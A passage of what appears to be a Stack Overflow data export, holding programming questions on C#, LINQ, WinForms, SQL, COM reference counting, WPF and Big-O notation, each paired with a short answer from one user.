
    return my_stack.pop
end
</code></pre>

<ol>
<li>I dont know a better way to check if the character in the expression is an Integer  without using this crude method or Regular Expressions. Do you guys have any suggestions?</li>
<li>Is there a way to abstract the cases. Is there an eval(""num1 ch num2"") function in Ruby?</li>
</ol>
","33708","","<p>I don't know ruby so I don't answer your questions. There is an algorithmic problem there, though. For add, multiply the order of operands doesn't matter but for subtraction and division, you should subtract and divide the first operand by the second. The first is the one deeper in stack. As a result, you should swap these two lines:</p>

<pre><code>num1 = my_stack.pop.to_i
num2 = my_stack.pop.to_i
</code></pre>
"
"<pre><code>Application.Run(form);
</code></pre>

<p>Actually I tried to call this from my project.  I got this exception.  How to solve it? I have already called another <code>Application.Run(frmBind);</code> in my project.</p>

<blockquote>
  <p>Starting a second message loop on a single thread is not a valid
  operation. Use Form.ShowDialog instead.</p>
</blockquote>

<pre><code> static void Main(string[] args)
 {
    frmBind = new frmMain();

    Application.Run(frmBind);

    //args1 = string.Copy(args);
}
</code></pre>

<p>This is where I call the Application at first</p>

<p>Now again did it here:</p>

<pre><code>try
{
   // Application.Run( form);
   form.ShowDialog();
}
</code></pre>

<p>Here the exception is thrown.</p>
","33708","","<p>It's telling you how to solve it:</p>

<pre><code> form.Show();
</code></pre>

<p>or if you want the new form to be modal:</p>

<pre><code> form.ShowDialog();
</code></pre>
"
"<p>I am using VSTS 2008 + C#. Is there any way to get the informaiton like, whether we are currently in dual monitor mode, how much is the current resolution of each desktop?</p>

<p>BTW: there are two modes of dual screen, duplicate screen or extended screen. I need a solution as well to distinguish between the different modes.</p>

<p>thanks in advance,
George</p>
","33708","","<pre><code>System.Windows.Forms.Screen
</code></pre>

<p>provides you with screen data. Duplicate screen is not really considered another screen from an application point of view.</p>
"
"<p>I just designed a simple ""For Loop"" using window form application. I would like that this will be only clickable once &amp; that it will not repeat the same information if I click the button. How could I do that? thanks
Here is my code:</p>

<pre><code>        int count;

        for (count = 0; count &lt; 5; count = count + 1)
        {
            listBox1.Items.Add(""This is count: "" + count);
        }
        const string textEnd = ""Done!!!"";
        {
            listBox1.Items.Add(textEnd);
        }
</code></pre>

<p>==== Additional Info ===
I've made it this way now. This will only click once, but the button is still enable. I think this is ok: </p>

<pre><code>        int count;

        for (count = 0; count &lt; 5; count++)
        {
            string newItem = ""This is count: "" + count; 
            if (listBox1.Items.IndexOf(newItem) &lt; 0) 
            { 
                listBox1.Items.Add(newItem); 
            }
         }

        const string textEnd = ""Done!!!"";
        if (listBox1.Items.IndexOf(textEnd) &lt;0)
        {
            listBox1.Items.Add(textEnd);
        }
</code></pre>
","33708","","<pre><code>button1.Enabled = false;
</code></pre>
"
"<pre><code> foreach (var incident in new DataAccess.IncidentRepository().GetItems().Where(
                    i =&gt; (startDate == null || i.IncidentDate &gt;= startDate)
                    &amp;&amp; (endDate == null || i.IncidentDate &lt;= endDate)
                    &amp;&amp; (shiftId == null || i.ShiftId == shiftId)
                    &amp;&amp; (processAreaId == null || i.ProcessAreaId == processAreaId)
                    &amp;&amp; (plantId == null || i.PlantId == plantId)))
</code></pre>

<p>is there a way I can <code>i.PlantId == plantId</code> not to get added if <code>plantId</code> is <code>null</code>? </p>

<p>Thanks</p>
","33708","","<pre><code>var incident in new DataAccess.IncidentRepository().GetItems().Where(
                    i =&gt; i.IncidentDate &gt;= startDate 
                    &amp;&amp; i.IncidentDate &lt;= endDate 
                    &amp;&amp; i.ShiftId == shiftId 
                    &amp;&amp; i.ProcessAreaId == processAreaId
                    &amp;&amp; (plantId == null || i.PlantId == plantId)))
</code></pre>

<p>Alternatively, you could:</p>

<pre><code>var incidents = new DataAccess.IncidentRepository().GetItems().Where(
                    i =&gt; i.IncidentDate &gt;= startDate 
                    &amp;&amp; i.IncidentDate &lt;= endDate 
                    &amp;&amp; i.ShiftId == shiftId 
                    &amp;&amp; i.ProcessAreaId == processAreaId));

if (plantId != null)
    incidents = incidents.Where(i =&gt; i.PlantId == plantId);

foreach (var incident in incidents) {
   // ...
}
</code></pre>
"
"<p>What's the easiest way to find Dom elements with a css selector, without using a library?</p>

<pre><code>function select( selector ) {
 return [ /* some magic here please :) */ ]
};

select('body')[0] // body;

select('.foo' ) // [div,td,div,a]

select('a[rel=ajax]') // [a,a,a,a]
</code></pre>

<p>This question is purely academical. I'm interested in learning how this is implemented and what the 'snags' are. What would the expected behavior of this function be? ( return array, or return first Dom element, etc ).</p>
","33708","","<p>No there's no built in way. Essentially, if you decide to go without jQuery, you'll be replicating a buggy version of it in your code.</p>
"
"<p>I'm writing a windows service in .net 2.0.</p>

<p>What should I do within the <code>OnStart()</code> method if for some reason I don't want my service to start? Can I simply call the <code>Stop()</code> method of the base class (<code>ServiceBase</code>)? I've tried that and am getting some funny memory access exceptions. Is it required to start a separate thread to call the <code>Stop()</code> method?</p>
","33708","","<p>Why do you want to do that? If there's an error, log it in event log and throw an exception. Your service won't be started and the user will be informed that something bad happened.</p>
"
"<p>I know I check it programmatically from   </p>

<pre><code> ConfigurationSection configSection =
      (CompilationSection) ConfigurationManager.GetSection( ""system.web/compilation"" );
</code></pre>

<p>I know that it is also somewhat slower to have  in production ... yet if we are in a kind of beta it does not harm yet ...</p>
","33708","","<p>Yes, it's available both in Debug and Release builds but it'll include more data (such as source line numbers) if you have the PDB in debug mode.</p>
"
"<p>I'm building a tiny webapplication in which our customers can update some details about their company. The customers currently don't have a login/password and we don't want to validate their registration, so we want to give them a automaticly generated password/key to login to the website.</p>

<p>Our plan to encrypt their customerId and give that to the customer so that he can enter that key on the webapp to allow us to decrypt the key into his ID.</p>

<p>There are about 10K customers and they don't all have an email, so some will receive a letter with the URL and the code. This means that the customer has to type the code in, so the code can't be more than 8 characters (preferably 6).</p>

<p>Here's an empty template:</p>

<pre><code>using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace ConsoleApplication1
{
    class Program
    {
        static void Main(string[] args)
        {
            int passwordLength = 6;
            int customerId = 12345;
            string encrypted = Crypter.Encrypt(customerId, ""secretKey"", passwordLength);
            if (customerId == Crypter.Decrypt(encrypted, ""secretKey""))
            {
                Console.WriteLine(""It worked! Well done!"");
            }
        }

    }

    public static class Crypter
    {
        public static string Encrypt(int input, string key, int passwordLength)
        {
            string encryptedString = """";
            //do encrypt stuffz here

            return encryptedString;
        }
        public static int Decrypt(string encryoted, string key)
        {
            int decrypted = 0;
            //do decrypt stuffz here

            return decrypted;
        }
    }
}
</code></pre>

<p><strong>=> Can anyone link me to more information on how to do this?</strong></p>

<p>I'm not looking for a ""plz send me teh codez"" but if anyone has already made something like this, feel free to share.</p>

<p>Thanks in advance for any information.</p>
","33708","","<p>Don't base your secret code on user ID. Instead, generate a random 6 character string for each customer and store it in the database. It's not vulnerable to finding the actual algorithm.</p>
"
"<p>I need help with my code. I would like to write only numbers/integers in my textbox and would like to display that in my listbox.</p>

<p>Is my code below in order? This seems to give an error.</p>

<pre><code>    int yourInteger;
    string newItem;

    newItem = textBox1.Text.Trim();

    if (newItem == Convert.ToInt32(textBox1.Text))
    {
        listBox1.Items.Add(newItem);
    }
</code></pre>

<p>====
Update:</p>

<p>This is how my code looks like now. My question is, can listBox handle the data type ""long""? Because when I entered the number 20,000,000 I just got an hour glass for 20 minutes. But when I tried this one with the console, I got the answer. So I'm not sure what kind of element can handle data type ""long"".</p>

<pre><code>    string newItem;
    newItem = textBox1.Text.Trim();

    Int64 num = 0;
    if(Int64.TryParse(textBox1.Text, out num))
    {
        for (long i = 2; i &lt;= num; i++)
        {
            //Controls if i is prime or not
            if ((i % 2 != 0) || (i == 2))
            {
                listBox1.Items.Add(i.ToString());
            }

        }
    }


    private void btnClear_Click(object sender, EventArgs e)
    {
        listBox1.Items.Clear();
    }
</code></pre>
","33708","","<pre><code>int result = int.Parse(textBox1.Text.Trim());
</code></pre>

<p>If you want to check for validity:</p>

<pre><code>int result;
if (int.TryParse(textBox1.Text.Trim(), out result)) // it's valid integer...
   // int is stored in `result` variable.
else
   // not a valid integer
</code></pre>
"
"<p>I have to calculate the relative time which is</p>

<pre><code>TimeSpan relativeTime = currentTime.Subtract(startTime);
</code></pre>

<p>Next I would like to convert relativeTime to double value which should be consisted of seconds and milliseconds (seconds.milliseconds).</p>

<p>Does anyone know what is the best way to generate such double value from time difference?</p>

<p>Thanks!</p>
","33708","","<pre><code>timeSpan.TotalSeconds
</code></pre>
"
"<p>I have one class.I need the same instance of the same class  at two differnt 
pages with  previous values assigend to that instance.?</p>

<p>so how to maintain the value of a instance b/w two pages....</p>
","33708","","<p>Store it in session:</p>

<pre><code>// Store
Session[""MyInstance""] = myObject;

// Read
MyObject myObject = (MyObject)Session[""MyInstance""];
</code></pre>
"
"<p>Consider this class:</p>

<pre><code>public class Column&lt;T&gt;
{
    public string Header { get; set; }
    public Func&lt;T, string&gt; ValueExpression { get; set; }
}
</code></pre>

<p>used like this:</p>

<pre><code>var columns = new List&lt;Column&lt;Employee&gt;&gt;
              {
                  new Column&lt;Employee&gt; {Header = ""Employee Id"", ValueExpression = e =&gt; e.EmployeeID.ToString()},
                  new Column&lt;Employee&gt; {Header = ""Name"", ValueExpression = e =&gt; e.FirstName + "" "" + e.LastName},
                  new Column&lt;Employee&gt; {Header = ""Employee Birthday Year"", ValueExpression = e =&gt; e.BirthDate.HasValue ? e.BirthDate.Value.Year.ToString() : """"},
                  new Column&lt;Employee&gt; { Header = ""test"", ValueExpression = e =&gt; e.Address}
              }
</code></pre>

<p>I would like to do a .Select() on an IQueryable to make it only retrieve the needed fields from the database. </p>

<p>So I want to do something like this:</p>

<pre><code>var expressions = columns.Select(c =&gt; c.ValueExpression).Combine();
IQueryable&lt;Employee&gt; employees = EmployeeRepository.GetEmployees();
employees = employees.Select(expressions);
</code></pre>

<p>Only ""Combine()"" obviously doesn't exist.. :-)</p>
","33708","","<pre><code>public static Func&lt;T, U[]&gt; Combine&lt;T, U&gt;(this Func&lt;T, U&gt;[] functions) {
    return t =&gt; functions.Select(fun =&gt; fun(t)).ToArray();
}
</code></pre>

<p>I'd declare that for generic <code>IEnumerable&lt;Func&lt;T, U&gt;&gt;</code> instead of array:</p>

<pre><code>public static Func&lt;T, IEnumerable&lt;U&gt;&gt; Combine&lt;T, U&gt;(this IEnumerable&lt;Func&lt;T, U&gt;&gt; functions)
{
    return t =&gt; functions.Select(fun =&gt; fun(t));
}
</code></pre>

<p>As mentioned in comments, this is not likely to work directly with LINQ to SQL. However, you could grab LINQ to SQL results by doing a <code>.AsEnumerable()</code> and process the rest on client side.</p>
"
"<p>I'm curious because I couldn't find out about this on MSDN. I've found the <code>Release()</code> function is present in various COM objects which I'm obviously supposed to use for deleting pointers. But I'm not sure what does it return exactly? I used to think it would return the number of references which still exist to the object remaining, therefore something like:</p>

<pre><code>while( pointer-&gt;Release() &gt; 0 );
</code></pre>

<p>Would obviously release all references to that pointer?</p>

<p>Or am I not seeing something?</p>

<p>*note I'm talking about this from the concept of the <code>IDirect3DTexture9::Release()</code> function</p>
","33708","","<p>Your theory is true. COM memory management is based on reference counting. The <code>Release</code> method of <code>IUnknown</code> interface will decrement the reference count and return it. That function will not release <em>references</em>. It doesn't know who holds the reference. It just decrements the reference count until it reaches zero and then the object will be destructed. It's dangerous as others might still hold a reference to it that will become invalid after object's destruction.</p>

<p>Thus, you should only call <code>Release</code> for each <code>AddRef</code> you had previously called.</p>
"
"<p>I'm coming at this from the Windows world... On Windows, we have Windows Installer packages (MSI files) that are processed by a system component (Windows Installer) to install applications (the idea being that this system component tracks references to libraries and implements transactional installation, theoretically avoiding botched installations)... </p>

<p>Could someone explain the architecture and process of how an application gets installed on OSX? Is there a corresponding component to Windows Installer? And if so, how would I go about using it for my applications?</p>
","33708","","<p>OS X apps are usually ""xcopy deployed"" and are self contained in so called <em>bundles</em>.</p>
"
"<p>When we hit that ""install now"" button via the AppStore, I am curious what is the process behind getting the app onto the iPhone?</p>

<p>Does it download a compressed zip? pkg? and does a XCOPY equivalent ?</p>
","33708","","<p>It downloads an <code>IPA</code> file which is technically a zipped file that contains the app along with DRM signatures and other stuff. It deploys the app by copying the folder to <code>/var/mobile/Applications/{GUID}/</code>.</p>
"
"<p>Why does Sql server doesn't allow more than one IDENTITY column in a table?? Any specific reasons.</p>
","33708","","<p>Why would you need it? SQL Server keeps track of <strong>a single value</strong> (current identity value) for each table with <code>IDENTITY</code> column so it can have just one identity column per table.</p>
"
"<p>HI,
I Am creating one user Control in windows Application which contain Treeview With n Nodes <br>
The NUmbe OF Nodes Will be decided At Runtime. <br>
I Want To Store Some Data On Each TreeNode Which I Can Retrieve When TreeNode Get Selected. <br>
Problem is that some node will store custid,custname.. <br>
some store studid,studname,,,,,,</p>

<p>I Have used Extension Methods <br>
static class Extension <br>
    { <br>
        static Dictionary m_Dictionary=new Dictionary(); <br>
        public static void SetTags(this TreeNode p_TreeNode, Dictionary  p_Dictionary)<br>
        { <br>
            m_Dictionary = p_Dictionary; <br>
        } <br>
        public static Dictionary GetTags(this TreeNode p_TreeNode) <br>
        { <br>
            return m_Dictionary; <br>
        } <br>
    } <br>
but it will not help becase iam getting data on the last node only... <br>
how i can achieve this .. <br>
is there is something like etension properties....or whether there is any other solution. <br>
Thank In Advance,,,,,,, <br></p>
","33708","","<p>No, there's no such thing as of C# 3.0. </p>

<p>Look at this:
<a href=""http://stackoverflow.com/questions/138367/most-wanted-feature-for-c-4-0"">http://stackoverflow.com/questions/138367/most-wanted-feature-for-c-4-0</a></p>
"
"<p>Table UserData (UserID,  Sales,   Credits)   </p>

<p>I need to return the SUM of sales, sum of credits and the # of rows returned for a given date range.</p>

<p>Is it possible in 1 query?</p>
","33708","","<pre><code>SELECT COUNT(*), SUM(Sales), SUM(Credits)
FROM UserData
WHERE TransactionDate BETWEEN @StartDate AND @EndDate
</code></pre>
"
"<pre><code> public IEnumerable&lt;SelectListItem&gt; GetList(int? ID)
 {
      return from s in db.List
             orderby s.Descript
             select new SelectListItem
             {
                 Text = s.Descript,
                 Value = s.ID.ToString(),
                 Selected = (s.ID == ID)
             };
 }
</code></pre>

<p>I return the above to a view and populate a <code>DropDownList</code>. I would like to add a default <code>SelectListItem (0, ""Please Select.."")</code> to the above linq result before it is returned to the view. Is this possible? </p>
","33708","","<pre><code>return new[] { new SelectListItem { Text = ... } }.Concat(
       from s in db.List
       orderby s.Descript
       select new SelectListItem
       {
           Text = s.Descript,
           Value = s.ID.ToString(),
           Selected = (s.ID == ID)
       });
</code></pre>
"
"<p>I'd like to to provide data to a table in the views. The data is not only from database but also from a csv file.</p>

<p>Should I store the data in the ViewData, or should I store it in a object and pass it to views? What is the best approach, or any other methods I can use? Thx!</p>
","33708","","<p>You should create a model object, fill it in the controller with data from heterogeneous sources and pass that model to the view.</p>
"
"<p>I've heard that it's a bad idea to use plain SQLite3 in an iPhone project. Which frameworks, libs, wrappers, etc. do you use? Which are worth looking at?</p>
","33708","","<p>Core Data is the way to go. It's only available in iPhone OS 3.0. This's not likely to be a problem though (for new apps).</p>
"
"<p>It always feels wrong to me to write</p>

<pre><code>if (MyObject)
    // do something
</code></pre>

<p>Or reversly</p>

<pre><code>if (!MyObject)
    // do something
</code></pre>

<p>However you could argue that it is less verbose than</p>

<pre><code>if (MyObject != null)
    // do something

if (MyObject == null)
    // do something
</code></pre>

<p>Are there any <strong>non-subjective</strong> reasons to use one over the other?</p>
","33708","","<p>In C#, you can't do </p>

<pre><code>if (MyObject)
</code></pre>

<p>to check for <code>null</code>s. It's a compile time error (if the class doesn't have an implicit boolean conversion operator).</p>

<pre><code>if (!MyObject)
</code></pre>

<p>is also invalid if the class doesn't overload <code>operator !</code> to return a boolean value (or a value that can be implicitly casted to a boolean). </p>

<p>So you have to stick with <code>obj == null</code> and <code>obj != null</code>.</p>

<p>To summarize, the non-subjective reason is being able to compile your code!</p>

<h3>UPDATE (story):</h3>

<p>Once upon a time, in ancient C, there was no <code>bool</code> type. Zero was considered <code>false</code> and every non-zero value was considered <code>true</code>. You could write </p>

<pre><code>while(1) { }
</code></pre>

<p>to create an infinite loop.<br />
You could also do things like </p>

<pre><code>int n  = 10;
while (n--) { }
</code></pre>

<p>to have a loop that executes <code>n</code> times. The problem with this strategy was:</p>

<pre><code>int x = 10;
if (x = 0) { // bug: meant to be x == 0
}
</code></pre>

<p>You missed a single character and you created a bug (most modern C compilers will issue a warning on this statement, but it's valid C, nevertheless).</p>

<p>This is why you see code like </p>

<pre><code>if (5 == variable) 

if (NULL == pObj)
</code></pre>

<p>in many places as it's not prone to the above mistake.</p>

<p>C# designers decided to <strong>require</strong> a <em>boolean</em> expression as the condition for <code>if</code>, <code>while</code>, etc., and not allow casting of types (unless they explicitly declare an overloaded operator, which is discouraged) to boolean to reduce the chance of errors. So things like:</p>

<pre><code>object x = null;
if (x) { }

int y = 10;
if (y) { }
while (y--) { }
</code></pre>

<p>that are valid in C, <strong>do not compile in C# at all</strong>.<br />
This is not a matter of style or agreement by any means.</p>
"
"<p>Using the C# object initializer syntax I can instantiate an anonymous object like this:</p>

<pre><code>object empData = new { name = ""bob"", age = 30, salary = 100000 };
</code></pre>

<p>But what if I have the initializer stored in a string, e.g.:</p>

<pre><code>string init = ""{ name = \""bob\"", age = 30, salary = 100000 }"";
</code></pre>

<p>Whats the best way of converting this string into an instance of the object?</p>
","33708","","<p>There's no direct easy way to do so. Basically, you have these options:</p>

<ol>
<li>Parse the string manually.</li>
<li>Use the C# compiler to compile that object as a part of an assembly and use reflection to figure out the contents.</li>
<li>(not sure if it's possible, C# 4.0 only): Use C# 4.0 managed compiler classes to parse the expression and infer the stuff.</li>
</ol>

<p>None of which is ideal in my opinion. I'd consider QueryString like pairs, XML or JSON or some other format that has parsers available out there instead if you have the option and consider storing data in a dictionary instance instead of creating an object for every expression.</p>
"
"<p>I'm working on a legacy application, i'm actually rewriting it from scratch in C#.NET.
and it used to give some kind of help to the user using WinHelp but Vista(the system i'm developping on) says it doesn't support WinHelp. so what i'm asking is :</p>

<p>How do I make a similar system from C#.NET ? I want the new feature to be used in Vista, XP and previous Windows versions.</p>
","33708","","<p>Use CHM files instead of pretty much deprecated WinHelp files. You can use <a href=""http://www.microsoft.com/downloads/details.aspx?familyid=00535334-c8a6-452f-9aa0-d597d16580cc&amp;displaylang=en"" rel=""nofollow"">HTML Help Workshop</a> to create those files.</p>
"
"<p>I am looking for a way to determine for a thread on which other thread it was originally spawned. I do not know whether a mechanism exists to do this, similar to the ""Parent"" property on Tasks in the new Task Parallel Library for .NET 4</p>

<p>Edit:
Further investigation actually seems to indicate that there is no location to store this information, so short of really ugly hacks this does not appear to be possible to implement transparently.</p>

<p>As such I think I will accept the sample code below as the most feasible (non-transparent) answer to solve the problem, even though I'll have to look for an alternate design myself. Thanks :)</p>
","33708","","<p>The system doesn't provide such functionality internally. You can pass the thread ID of the parent thread to the thread start function pretty easily:</p>

<pre><code>static class ThreadSpawner
{
    [ThreadStatic]
    private static int parentThreadId;
    public static int ParentThreadId
    {
        get { return parentThreadId; }
    }

    private class ThreadInfo
    {
        public int ParentId;
        public Action Method;
    }

    private static void StartThread(object parameter)
    {
        var threadInfo = (ThreadInfo)parameter;
        parentThreadId = threadInfo.ParentId;
        threadInfo.Method();
    }

    public static void Spawn(Action start)
    {
        new Thread(StartThread).Start(
            new ThreadInfo { 
                 Method = start, 
                 ParentId = Thread.CurrentThread.ManagedThreadId 
            });
    }
}


// Usage:
ThreadSpawner.Spawn(MyMethod);

static void MyMethod() { 
    Console.WriteLine(ThreadSpawner.ParentThreadId);
}
</code></pre>
"
"<p>I want to save and load my xml data using XmlReader. But I don't know how to use this class. Can you give me a sample code for start?</p>
","33708","","<p>You should use the <code>Create</code> method instead of using <code>new</code>, since <code>XmlReader</code> is an <code>abstract class</code> using <a href=""http://en.wikipedia.org/wiki/Abstract%5Ffactory%5Fpattern"">the Factory pattern</a>.</p>

<pre><code>var xmlReader = XmlReader.Create(""xmlfile.xml"");
</code></pre>
"
"<p>It appears so, but I can't find any definitive documentation on the subject.</p>

<p>What I'm asking is if the result of this query:</p>

<pre><code>from x
in Db.Items
join y in Db.Sales on x.Id equals y.ItemId
group x by x.Id into g
orderby g.Count() descending
select g.First()
</code></pre>

<p>is ALWAYS THE SAME as the following query:</p>

<pre><code>from x
in Db.Items
join y in Db.Sales on x.Id equals y.ItemId
group x by x.Id into g
select g.First()
</code></pre>

<p>note that the second query lets Linq decide the ordering of the group, which the first query sets as number sold, from most to least.</p>

<p>My ad-hoc tests seem to indicate that Linq automatically sorts groups this way, while the <a href=""http://msdn.microsoft.com/en-us/library/bb534501.aspx"" rel=""nofollow"">documentation</a> seems to indicate that the opposite is true--items are returned in the order they appear in the select.  I figure if it comes sorted this way, adding the extra sort is pointless and wastes cycles, and would be better left out.</p>
","33708","","<p>LINQ grouping does not guarantee such a thing. While it might work for that specific circumstance, it might not work in another situation. <strong><em>Avoid relying on this side effect</em></strong>.</p>

<p>By the way, if the output is really intentionally sorted by SQL Server due to clustered index or something, adding an <code>ORDER BY</code> clause won't hurt because query optimizer should be smart enough to know that the result is already sorted, so you won't lose anything.</p>
"
"<p>Are there any O(1/n) algorithms?</p>

<p>Or anything else which is less than O(1)? </p>
","33708","","<p>I think the source of the debate is possibly the <a href=""http://stackoverflow.com/questions/471199/what-is-the-difference-between-n-and-on/471206#471206"">misconception of Big-Oh and Big-theta notations</a>. </p>

<p>In some answers and comments it was mentioned that a <code>O(1/n)</code> can be considered <code>O(1)</code> as the function is already bounded to some constant. This is true <em>and indeed, it's the nature of Big-Oh notation. You can say QuickSort is O(n<sup>100</sup>) and you are technically correct as it's a <strong>valid upper bound</strong> (which is not very tight in this example)</em>. </p>

<p>As a result, technically, this question is obvious: If anything is less than O(1) <em>(or O(whatever), for that matter)</em>, it would <strong>also</strong> be O(1) <em>(O(<code>&gt;</code> whatever))</em>, by definition.</p>

<p>In regular speech, we mostly use Big-Oh to mean tight bounds (instead of Big-theta, which is the correct notation for it). Basically, the question should not include the ""or anything less than O(1)"" part. <a href=""http://stackoverflow.com/questions/905551/are-there-any-o1-n-algorithms/905832#905832"">Konrad's answer</a> is completely right.</p>

<p>These notations are <strong>theoretical concepts</strong>. They don't take one important thing into account that currently limits us in practice: In practice, our machines are <strong>finite</strong> and this is where it seems like a paradox. In a finite machine, our ""<code>n</code>"" <strong>always</strong> has an upper bound. Therefore ""<code>1/n</code>"" will have a lower bound which is a constant. So the algorithm practically looks <code>O(1)</code> in <strong>all finite state machines</strong> but because our <strong>n</strong> can never become big enough.</p>

<hr>

<p>To those who believe that there are no <code>o(1)</code> (small-oh) algorithms in practice (as mentioned in some answers), I can argue that in practice all algorithms that eventually halt are also <code>O(1)</code>. With the similar reasoning mentioned above, because the input itself is always bounded, any function of input will also be bounded (it can be very large, but it still has a constant bound!), so every algorithm is <code>O(1)</code> in finite machines. (Put it differently, pigeonhole principle implies that every deterministic finite state machine with <code>S</code> different states can have at most <code>S</code> transitions before getting back to the original state. So any algorithm that eventually halts, which should not make the machine return to the start state, can have at most <code>S-1</code> state transitions, so every algorithm will be O(1)).</p>

<hr>

<p>As pointed out in the comments, computation, as defined by the Turing machine model, is inherently discrete. <em>That will imply that <code>1/n</code> algorithms cannot exist in a discrete computational model</em>. My point is, when using the asymptotic growth about <em>practical implementation</em> of algorithms, we are already ignoring some limitations (for good reasons). There can be algorithms with decreasing running times (till it reaches a bound, of course) as the input grows (as Konrad said). Similarly, one may skew the use of notation to describe the running time of an implementation of such an algorithm.</p>
"
"<p>I'm involved in a project where a team of developers is building a very long term infrastructure project to replace an existing 10 year old system. By ""very long term"" I mean it must be operating, supported and maintained for at least 10 years into the future from the point of release. Taking into account ~2 years of development, this means we should at this point choose a technology/language/framework to last at least 12 years. We have full control over the computers running the project, their operating systems, etc. I was the developer of the to-be-replaced 10 year old system, and I'm helping the team build the new one right. </p>

<p>The application has a very complex user interface. The UI is built dynamically from configuration files at start-up, each UI component has dependencies on logic and other UI components, which it must receive in run-time. UI elements themselves are very complex, imagine custom gauges, graphs, knobs etc. </p>

<p>Two choices have already been made in the project, that I do not judge or try to change:</p>

<ol>
<li>It will be a desktop application</li>
<li>It will be developed in C#</li>
</ol>

<p>Now we are at a point of choosing the right framework to make our very flexible UI system ""easy to develop"", i.e. reduce the number of developer bugs by relying on a debugged, already-made framework.</p>

<p>The team examined Microsoft's CAB (Composite UI), which suited its purposes extremely well, however the fact Microsoft discontinued it in 2007 is a huge problem taking into account the long-term aspects of the project (think of a framework bug being discovered in 6 years - who will provide support? - and I know we could fix the code in the CAB itself, but that's something we would like to avoid).</p>

<p>One thing that obviously pops to mind is relying Microsoft's WPF. It seems to be ""the future"" of UI development, however it frightens me when thinking about it long term. My main concern is that the market will not accept it, that 3 years from now Microsoft will discontinue it, and that 6 years from now I will not be able to receive proper support for it.</p>

<p>However I don't really see an alternative, besides writing our own framework. I don't want disrespect any 3rd party framework developers, but for such a long term project I can only use products/frameworks/etc from very well-established vendor. </p>

<p>I would appreciate thoughts on whether choosing WPF is the right call given the above context (and if not - what is the right ""complex UI framework"" for such a long term desktop application project using C# ?).</p>

<p>Thanks (and sorry for the long question)</p>
","33708","","<p>Ultra-long-term? 10 years? COBOL is STILL being used!</p>

<p>Joking aside, I believe WPF is your best bet. Microsoft has invested heavily in WPF and XAML over the past few years and using the same core infrastructure on Silverlight (which Microsoft really cares about) is a strong point for sticking to it for enough time. I don't think WPF is going to be thrown away anytime soon.</p>
"
"<p>How to get the classes that are available in a '.cs' file.? Like we can get the classes and methods in an Assembly using,</p>

<pre><code>Assembly.GetTypes() and Type.GetMethods()
</code></pre>

<p>to get the Class and methods in an Assembly.</p>

<p>Similarly how to get all the classes present within a C# file(.cs file).? I need to get the <strong>classes in a .cs file</strong> from which i can easily get the methods within them and further details like parameters of methods etc. </p>
","33708","","<p><strong>Short of using a C# parser</strong>, there's no direct way of doing it. You could compile the <code>.cs</code> file using <code>CSharpCodeProvider</code> (which only works if the file compiles on its own and you can tell all the referenced assemblies to the compiler) and use reflection on the resulting assembly.</p>
"
"<p>Here's the binary tree in question. The leaves are a, b, c, d and the edges are labelled 0 or 1.</p>

<pre><code>    .
   / \
  a   .
     / \
    b   .
       / \
      c   d
</code></pre>

<p>It seems to me that it is a full binary tree, as every node is either a leaf or has two child nodes, however I have this feeling that we were told it is not a full binary tree. If not, why is it not?</p>

<p>If a node has a child that is a leaf, does that not count as a child node?</p>
","33708","","<p>You are confusing a perfect binary tree with a full binary tree. A perfect binary tree is a full binary tree with all leaf nodes at the same level. So yes, the picture is a full binary tree.</p>

<p>A leaf is defined as a node without a child node.<br />
Thus, a full binary tree is a binary tree in which each node has either zero or two children.</p>

<p><a href=""http://en.wikipedia.org/wiki/Binary%5Ftree"" rel=""nofollow"">Wikipedia</a> helps very well with definitions. Make sure you check it out.</p>
"
"<p>How to write or generate  an XML file using C# to get the result below?</p>

<pre><code>&lt;?xml version=""1.0"" encoding=""UTF-8""?&gt;
&lt;pages&gt;
&lt;page name=""Page Name 1"" url=""/page-1/"" /&gt;
&lt;page name=""Page Name 2"" url=""/page-2/"" /&gt;
&lt;page name=""Page Name 3"" url=""/page-3/"" /&gt;
&lt;page name=""Page Name 4"" url=""/page-4/"" /&gt;
&lt;/pages&gt;
</code></pre>
","33708","","<pre><code>using System.Linq;
using System.Xml;
using System.Xml.Linq;

// ...

using (var writer = XmlWriter.Create(""output.xml""))
     new XDocument(
        new XDeclaration(""1.0"", ""UTF-8"", null),
        new XElement(""pages"",
            Enumerable.Range(1, 4)
                .Select(i =&gt; new XElement(""page"",
                                  new XAttribute(""name"", ""Page Name "" + i),
                                  new XAttribute(""url"", ""/page-"" + i + ""/""))))
     ).WriteTo(writer);
</code></pre>
"
"<p>I'm new to Linq, what's the syntax for orderby in VB?</p>

<pre><code>Dim cxt As New datContext
Dim qry = (From lst In cxt.zipcodes _
              Select lst.state).Distinct

    qry = qry.OrderBy()
</code></pre>

<p>my simple sql statement will be like this:</p>

<pre><code>Select distinct state from zipcodes
order by State
</code></pre>
","33708","","<pre><code>qry = qry.OrderBy(Function(obj) obj.PropertyToSortBy)
</code></pre>
"
"<p>As a professional .net developer (at least this is how I earn my money) I wonder if Mono for the Mac is worth a closer look.
I already tried Mono 3 years ago when I first got my iMac but the installation was impossible to master and after half a day I just gave up.
I also got help from a Unix professional but we both were unable to get Mono running on my Mac.</p>

<p>Like I said that was some years ago. How is the state of Mono for OS X today? Installation still painful? How about compatibility to .NET Framework 2.0?</p>
","33708","","<p>It's very easy to set it up. It's much more mature than it was 3 years ago but you should still consider libraries that have problems with Mono. I mean, you should test apps rather than blindly assuming its compatible with Mono.</p>

<p>From a developer perspective, MonoDevelop hardly competes even with a half of Visual Studio Express.</p>
"
"<p>I have a master page in my website.</p>

<p>I have two  contentplaceholder on that master page.
In one contentplaceholder i have some links on which click I want to  redirect 
to the corresponding page in the second contetplaceholder on the same master page.</p>

<p>how can i do this....?</p>

<p>pls help  ..?</p>
","33708","","<p>I don't see a problem here. Just make the <code>.aspx</code> pages use the same master page and set the link locations to <code>.aspx</code> pages. </p>
"
"<p>I have a full path as given below.</p>

<pre><code>C:\Users\Ronny\Desktop\Sources\Danny\kawas\trunk\csharp\ImportME\XukMe\bin\Debug\DannyGoXuk.DTDs.xhtml-math-svg-flat.dtd
</code></pre>

<p>How can the DTDs ""part"" to be fetched from this whole part?  </p>

<p>Desired output:</p>

<pre><code>C:\Users\Ronny\Desktop\Sources\Danny\kawas\trunk\csharp\ImportME\XukMe\bin\Debugââ\DannyGoXuk.DTDs
</code></pre>

<p>Can I use <code>String</code>'s methods for this?<br>
If yes, then how to fetch it?  </p>
","33708","","<p>Calling</p>

<pre><code>System.IO.Path.GetFileName
</code></pre>

